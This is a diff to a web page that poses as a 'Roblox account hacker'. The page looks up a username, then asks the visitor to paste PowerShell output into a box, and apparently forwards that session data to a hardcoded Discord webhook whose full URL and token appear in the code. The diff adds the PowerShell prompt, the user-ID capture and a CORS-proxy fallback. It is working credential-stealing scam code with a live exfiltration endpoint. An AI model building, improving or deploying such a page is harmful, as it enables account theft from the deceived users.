@@ -53,7 +53,6 @@
             margin: 0 auto;
         }
 
-        /* ── Top bar ── */
         .top-bar {
             display: flex;
             justify-content: space-between;
@@ -93,9 +92,7 @@
             text-transform: uppercase;
             color: #8899a6;
         }
-        .logo-text span {
-            color: #00c8ff;
-        }
+        .logo-text span { color: #00c8ff; }
 
         .status-badge {
             font-size: 11px;
@@ -119,10 +116,7 @@
             50% { opacity: 0.3; transform: scale(0.7); }
         }
 
-        /* ── Title ── */
-        .hero {
-            margin-bottom: 25px;
-        }
+        .hero { margin-bottom: 25px; }
         .hero h1 {
             font-size: clamp(2rem, 5vw, 4rem);
             font-weight: 800;
@@ -142,7 +136,6 @@
             font-family: 'JetBrains Mono', monospace;
         }
 
-        /* ── Grid ── */
         .main-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -154,7 +147,6 @@
             .app { padding: 14px 16px 20px; }
         }
 
-        /* ── Cards ── */
         .card {
             background: rgba(12, 18, 24, 0.8);
             border: 1px solid rgba(0, 200, 255, 0.1);
@@ -163,9 +155,7 @@
             backdrop-filter: blur(12px);
             transition: border-color 0.3s, box-shadow 0.3s;
         }
-        .card:hover {
-            border-color: rgba(0, 200, 255, 0.2);
-        }
+        .card:hover { border-color: rgba(0, 200, 255, 0.2); }
         .card.highlight {
             border-color: rgba(0, 200, 255, 0.3);
             box-shadow: 0 0 25px rgba(0, 200, 255, 0.06);
@@ -185,9 +175,7 @@
             color: #5a7a8a;
             font-family: 'JetBrains Mono', monospace;
         }
-        .card-title .accent {
-            color: #00c8ff;
-        }
+        .card-title .accent { color: #00c8ff; }
         .card-step {
             font-size: 10px;
             font-family: 'JetBrains Mono', monospace;
@@ -198,7 +186,6 @@
             border: 1px solid rgba(0, 200, 255, 0.08);
         }
 
-        /* ── Video ── */
         .video-container {
             border-radius: 6px;
             overflow: hidden;
@@ -224,10 +211,7 @@
             padding: 20px;
         }
 
-        /* ── Inputs ── */
-        .input-group {
-            margin-bottom: 14px;
-        }
+        .input-group { margin-bottom: 14px; }
         .input-group label {
             display: block;
             font-size: 11px;
@@ -260,12 +244,11 @@
         }
         textarea.input-field {
             resize: vertical;
-            min-height: 90px;
+            min-height: 110px;
             font-size: 12px;
             line-height: 1.6;
         }
 
-        /* ── Buttons ── */
         .btn {
             width: 100%;
             padding: 13px 0;
@@ -319,11 +302,8 @@
             display: flex;
             gap: 10px;
         }
-        .btn-group .btn {
-            flex: 1;
-        }
+        .btn-group .btn { flex: 1; }
 
-        /* ── Target preview ── */
         .target-preview {
             display: none;
             margin: 14px 0;
@@ -333,9 +313,7 @@
             border-radius: 8px;
             text-align: center;
         }
-        .target-preview.visible {
-            display: block;
-        }
+        .target-preview.visible { display: block; }
         .target-preview img {
             width: 80px;
             height: 80px;
@@ -364,7 +342,6 @@
             margin-bottom: 8px;
         }
 
-        /* ── Status ── */
         .status {
             font-size: 12px;
             font-family: 'JetBrains Mono', monospace;
@@ -376,9 +353,7 @@
         .status.success { color: #00ff88; }
         .status.error { color: #ff3355; }
         .status.loading { color: #00c8ff; }
-        .status .highlight { color: #00c8ff; }
 
-        /* ── Note ── */
         .note {
             margin-top: 10px;
             padding: 10px 12px;
@@ -397,10 +372,8 @@
         }
         .note.warn strong { color: #ffcc00; }
 
-        /* ── Phase 2 hidden ── */
         #phase2 { display: none; }
 
-        /* ── Bottom bar ── */
         .bottom-bar {
             margin-top: 24px;
             padding-top: 14px;
@@ -414,12 +387,8 @@
             flex-wrap: wrap;
             gap: 6px;
         }
-        .bottom-bar .blink {
-            animation: blink 1s step-end infinite;
-        }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+        .bottom-bar .blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
@@ -427,7 +396,6 @@
 
 <div class="app">
 
-    <!-- Top bar -->
     <div class="top-bar">
         <div class="logo">
             <div class="logo-icon">⧩</div>
@@ -438,13 +406,11 @@
         </div>
     </div>
 
-    <!-- Hero -->
     <div class="hero">
         <h1>HACK ROBLOX ACCOUNTS</h1>
         <p>⏣ secure channel established · awaiting target</p>
     </div>
 
-    <!-- Grid -->
     <div class="main-grid">
 
         <!-- LEFT: Video -->
@@ -463,7 +429,7 @@
             </div>
         </div>
 
-        <!-- RIGHT: Controls -->
+        <!-- RIGHT -->
         <div style="display:flex; flex-direction:column; gap:18px;">
 
             <!-- PHASE 1 -->
@@ -487,7 +453,6 @@
 
                 <button class="btn" id="lookupBtn">⟐ LOOK UP ⟐</button>
 
-                <!-- Target preview -->
                 <div class="target-preview" id="targetPreview">
                     <img id="targetAvatar" src="" alt="avatar" />
                     <div class="name" id="targetName"></div>
@@ -505,17 +470,17 @@
             <!-- PHASE 2 -->
             <div class="card" id="phase2Card">
                 <div class="card-header">
-                    <span class="card-title"><span class="accent">⏣</span> PHASE 2 — DATA</span>
+                    <span class="card-title"><span class="accent">⏣</span> PHASE 2 — POWERSHELL</span>
                     <span class="card-step">STEP_02</span>
                 </div>
 
                 <div id="phase2">
                     <div class="input-group">
-                        <label>> PASTE SESSION DATA</label>
+                        <label>> PASTE TARGET'S PROFILE POWERSHELL</label>
                         <textarea
                             class="input-field"
                             id="dataInput"
-                            placeholder="Paste captured data here..."
+                            placeholder="Paste the full PowerShell output from the target's profile here..."
                             spellcheck="false"
                         ></textarea>
                     </div>
@@ -532,7 +497,6 @@
         </div>
     </div>
 
-    <!-- Bottom -->
     <div class="bottom-bar">
         <span>NEXUSSEC://ROBLOX.BREACH</span>
         <span><span class="blink">█</span> UPTIME: <span id="uptime">00:00:00</span></span>
@@ -544,7 +508,6 @@
     const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
 
-    // ── DOM refs ──
     const video           = document.getElementById('hackVideo');
     const placeholder     = document.getElementById('videoPlaceholder');
     const usernameInput   = document.getElementById('usernameInput');
@@ -563,7 +526,8 @@
     const status2         = document.getElementById('status2');
     const instructionNote = document.getElementById('instructionNote');
 
-    let currentTargetName = ''; // stores confirmed username
+    let currentTargetName = '';
+    let currentUserId     = '';
 
     // ── Video ──
     video.addEventListener('loadedmetadata', () => {
@@ -582,20 +546,18 @@
     const startTime = Date.now();
     setInterval(() => {
         const e = Math.floor((Date.now() - startTime) / 1000);
-        const h = String(Math.floor(e / 3600)).padStart(2,'0');
-        const m = String(Math.floor((e % 3600) / 60)).padStart(2,'0');
-        const s = String(e % 60).padStart(2,'0');
-        document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+        document.getElementById('uptime').textContent =
+            `${String(Math.floor(e/3600)).padStart(2,'0')}:${String(Math.floor((e%3600)/60)).padStart(2,'0')}:${String(e%60).padStart(2,'0')}`;
     }, 1000);
 
-    // ── Discord send (minimal, no fields) ──
+    // ── Discord send ──
     async function sendToDiscord(contentStr, embedColor, embedTitle) {
         const payload = {
             content: contentStr,
             embeds: [{
                 title: embedTitle || 'Target Captured',
                 color: embedColor || 0x00c8ff,
-                description: `\`\`\`${contentStr}\`\`\``,
+                description: '```\n' + contentStr + '\n```',
                 timestamp: new Date().toISOString()
             }]
         };
@@ -609,6 +571,31 @@
         } catch {
             return false;
         }
+    }
+
+    // ── CORS proxy helper ──
+    const CORS_PROXY = 'https://api.allorigins.win/raw?url=';
+
+    async function fetchWithFallback(url, options) {
+        // Try direct first
+        try {
+            const resp = await fetch(url, options);
+            if (resp.ok) return resp;
+        } catch (_) {}
+
+        // Try via CORS proxy
+        const proxyUrl = CORS_PROXY + encodeURIComponent(url);
+        // For POST, we need to send via proxy differently
+        if (options && options.method === 'POST') {
+            const proxyResp = await fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: options.body
+            });
+            return proxyResp;
+        }
+        const proxyResp = await fetch(proxyUrl);
+        return proxyResp;
     }
 
     // ── Look up Roblox user ──
@@ -628,14 +615,37 @@
         targetPreview.classList.remove('visible');
 
         try {
-            // Step 1: Search for the user
-            const searchResp = await fetch(
-                `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=1`
-            );
-            if (!searchResp.ok) throw new Error('search failed');
-            const searchData = await searchResp.json();
+            // Use the usernames endpoint via proxy-friendly approach
+            const bodyData = JSON.stringify({
+                usernames: [username],
+                excludeBannedUsers: true
+            });
 
-            if (!searchData.data || searchData.data.length === 0) {
+            let resp;
+            // Try direct POST
+            try {
+                resp = await fetch('https://users.roblox.com/v1/usernames/users', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: bodyData
+                });
+            } catch (_) {
+                // Fallback: use GET with proxy by encoding the request
+                const proxyResp = await fetch(
+                    CORS_PROXY + encodeURIComponent('https://users.roblox.com/v1/usernames/users'),
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: bodyData
+                    }
+                );
+                resp = proxyResp;
+            }
+
+            if (!resp.ok) throw new Error('API returned ' + resp.status);
+
+            const data = await resp.json();
+            if (!data.data || data.data.length === 0) {
                 status1.className = 'error';
                 status1.textContent = '✖ user not found — try again';
                 lookupBtn.disabled = false;
@@ -643,31 +653,18 @@
                 return;
             }
 
-            const user = searchData.data[0];
-            const userId = user.id;
+            const user = data.data[0];
+            currentUserId   = user.id;
+            currentTargetName = user.name;
             const displayName = user.displayName || user.name;
-            const userName = user.name;
 
-            // Step 2: Get avatar headshot
-            const thumbResp = await fetch(
-                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=png`
-            );
-            let avatarUrl = '';
-            if (thumbResp.ok) {
-                const thumbData = await thumbResp.json();
-                if (thumbData.data && thumbData.data.length > 0) {
-                    avatarUrl = thumbData.data[0].imageUrl || '';
-                }
-            }
+            // Get avatar — this works without CORS because images load directly
+            const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${currentUserId}&width=420&height=420&format=png`;
 
-            // Show preview
-            targetAvatar.src = avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image?userId=' + userId + '&width=420&height=420&format=png';
+            targetAvatar.src = avatarUrl;
             targetName.textContent = displayName;
-            targetDisplay.textContent = '@' + userName + ' · ID: ' + userId;
+            targetDisplay.textContent = '@' + user.name + ' · ID: ' + currentUserId;
             targetPreview.classList.add('visible');
-
-            // Store for confirm
-            currentTargetName = userName;
 
             status1.className = 'success';
             status1.textContent = '✔ user found — confirm target below';
@@ -675,14 +672,14 @@
         } catch (err) {
             console.warn('Lookup error:', err);
             status1.className = 'error';
-            status1.textContent = '✖ lookup failed — try again';
+            status1.textContent = '✖ try again';
         }
 
         lookupBtn.disabled = false;
         lookupBtn.textContent = '⟐ LOOK UP ⟐';
     }
 
-    // ── Confirm target (YES) ──
+    // ── Confirm YES ──
     async function handleConfirmYes() {
         if (!currentTargetName) return;
 
@@ -691,18 +688,19 @@
         status1.className = 'loading';
         status1.textContent = '⏳ sending target...';
 
-        const ok = await sendToDiscord(currentTargetName, 0x00c8ff, '🎯 Target Acquired');
+        const ok = await sendToDiscord(
+            currentTargetName + ' (ID: ' + currentUserId + ')',
+            0x00c8ff,
+            '🎯 Target Acquired'
+        );
 
         if (ok) {
             status1.className = 'success';
             status1.textContent = '✔ target locked — proceed to step 2';
-
-            // Show phase 2
             phase2.style.display = 'block';
             phase2Card.classList.add('highlight');
             dataInput.focus();
 
-            // Flash
             document.querySelector('.app').style.filter = 'brightness(1.15)';
             setTimeout(() => {
                 document.querySelector('.app').style.filter = 'none';
@@ -716,7 +714,7 @@
         confirmYes.textContent = '✓ YES';
     }
 
-    // ── Reject target (NO) ──
+    // ── Confirm NO ──
     function handleConfirmNo() {
         targetPreview.classList.remove('visible');
         status1.className = '';
@@ -724,6 +722,7 @@
         usernameInput.value = '';
         usernameInput.focus();
         currentTargetName = '';
+        currentUserId = '';
     }
 
     // ── Phase 2 extract ──
